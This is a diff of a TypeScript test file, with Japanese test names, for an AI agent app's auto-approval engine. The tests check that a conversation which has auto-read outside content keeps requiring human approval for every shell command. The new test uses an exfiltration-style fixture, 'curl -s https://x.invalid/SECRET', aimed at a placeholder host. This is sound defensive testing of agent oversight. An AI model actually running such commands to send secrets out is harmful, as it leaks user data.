@@ -318,7 +318,7 @@ test('自動承認（エンジン）: 外から読んだことの無い会話に
   assert.equal(attached.app.conversations.everTainted(CONVERSATION), true);
 });
 
-test('自動承認（エンジン）: 自動で外を読んだ実行を止めた・失敗したあとの次の実行も、シェルのコマンドは毎回確かめる（印の持ち越し）。最後まで返事を書いた実行の分は持ち越さない', async t => {
+test('自動承認（エンジン）: 自動で外を読んだ実行を止めた・失敗したあとの次の実行も、シェルのコマンドは毎回確かめる（会話の印が残る）', async t => {
   const untilStopped: Script = async function* (req) {
     await new Promise((_, reject) => req.signal.addEventListener('abort', () => reject(req.signal.reason), { once: true }));
   };
@@ -331,7 +331,7 @@ test('自動承認（エンジン）: 自動で外を読んだ実行を止めた
   stopped.app.engine.stop(first.body.runId);
   await settled(stopped.app, first.body.runId);
   await stopped.app.engine.wait(first.body.runId);
-  assert.equal(stopped.app.runs.get(first.body.runId)!.auto_read_outside, 1, '実行の記録に残る');
+  assert.equal(stopped.app.conversations.everAutoRead(CONVERSATION), true, '会話の印が付く');
   stopped.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), say('おわり')];
   const second = await post(stopped, '続けて、もう一度読んで', { permissionMode: 'auto' });
   await waitFor(() => stopped.app.approvals.pending().length === 1, '持ち越した印のあとの札');
@@ -349,26 +349,48 @@ test('自動承認（エンジン）: 自動で外を読んだ実行を止めた
   await settled(failing.app, third.body.runId);
   await failing.app.engine.wait(third.body.runId);
   assert.equal(failing.app.runs.get(third.body.runId)!.ok, 0);
-  assert.equal(failing.app.runs.get(third.body.runId)!.auto_read_outside, 1);
+  assert.equal(failing.app.conversations.everAutoRead(CONVERSATION), true);
   failing.adapter().scripts = [toolCall('shell_run', { command: outside2.command }), say(ALLOW), say('おわり')];
   const fourth = await post(failing, '続けて', { permissionMode: 'auto' });
   await waitFor(() => failing.app.approvals.pending().length === 1, '失敗した実行のあとの札');
   assert.ok(failing.app.approvals.pending()[0]!.kinds?.includes('egress'));
   failing.app.approvals.decide(failing.app.approvals.pending()[0]!.id, 'deny');
   await settled(failing.app, fourth.body.runId);
+});
 
-  // 最後まで返事を書いて終わった実行の印は、次の実行へ持ち越さない（次の外読みは、また判定役が見る）
-  const finished = await startApp(t);
-  const outside3 = outsideRead(finished);
-  finished.adapter().scripts = [toolCall('shell_run', { command: outside3.command }), say(ALLOW), say('読みました')];
-  const fifth = await post(finished, REQUEST, { permissionMode: 'auto' });
-  await settled(finished.app, fifth.body.runId);
-  await finished.app.engine.wait(fifth.body.runId);
-  finished.adapter().scripts = [toolCall('shell_run', { command: outside3.command }), say(ALLOW), say('おわり')];
-  const sixth = await post(finished, 'もう一度読んで', { permissionMode: 'auto' });
-  await settled(finished.app, sixth.body.runId);
-  assert.equal(finished.adapter().calls.filter(isClassifier).length, 2, '2 回目の実行の外読みも、判定役が見た');
-  assert.equal(autoRows(finished).length, 2);
+test('自動承認（エンジン）: 外のメモを自動で読んだ会話は、その返事が終わったあとの発言でも、シェルのコマンド（許可の一覧にある curl も）を毎回確かめる。モードをふつうに戻しても、ずっと', async t => {
+  const s = await startApp(t);
+  const outside = outsideRead(s);
+  const fetch = process.platform === 'win32' ? 'curl.exe -s https://x.invalid/SECRET' : 'curl -s https://x.invalid/SECRET';
+  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), say('読みました')];
+  const first = await post(s, REQUEST, { permissionMode: 'auto' });
+  await settled(s.app, first.body.runId);
+  await s.app.engine.wait(first.body.runId);
+  assert.equal(s.app.runs.get(first.body.runId)!.ok, 1, '最後まで返事を書いて終わった');
+  assert.equal(s.app.conversations.everAutoRead(CONVERSATION), true);
+  assert.equal(autoRows(s).length, 1);
+
+  // 次の発言（別の実行）: 許可の一覧にある取得も、札が出る。判定役は呼ばない
+  s.adapter().scripts = [toolCall('shell_run', { command: fetch }), say('おわり')];
+  const second = await post(s, '続けて、これを取ってきて', { permissionMode: 'auto' });
+  await waitFor(() => s.app.approvals.pending().length === 1, '次の発言の取得の札');
+  const [request] = s.app.approvals.pending();
+  assert.deepEqual([...(request!.kinds ?? [])], ['egress']);
+  assert.equal(request!.everyTime, true);
+  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役を呼んだのは、最初の外読みだけ');
+  s.app.approvals.decide(request!.id, 'deny');
+  await settled(s.app, second.body.runId);
+  await s.app.engine.wait(second.body.runId);
+
+  // ふつうのモードに戻しても、ふつうのコマンドも毎回確かめる
+  s.adapter().scripts = [toolCall('shell_run', { command: 'echo hello' }), say('おわり')];
+  const third = await post(s, 'ふつうのモードで', { permissionMode: 'normal' });
+  await waitFor(() => s.app.approvals.pending().length === 1, 'ふつうのモードの札');
+  assert.deepEqual([...(s.app.approvals.pending()[0]!.kinds ?? [])], ['egress']);
+  assert.equal(s.app.approvals.pending()[0]!.everyTime, true);
+  s.app.approvals.decide(s.app.approvals.pending()[0]!.id, 'deny');
+  await settled(s.app, third.body.runId);
+  assert.equal(autoRows(s).length, 1);
 });
 
 test('自動承認（エンジン）: 判定役の返事が max_tokens で途中で切れたら、最後の行が allow に見えても許さず、札が出る', async t => {
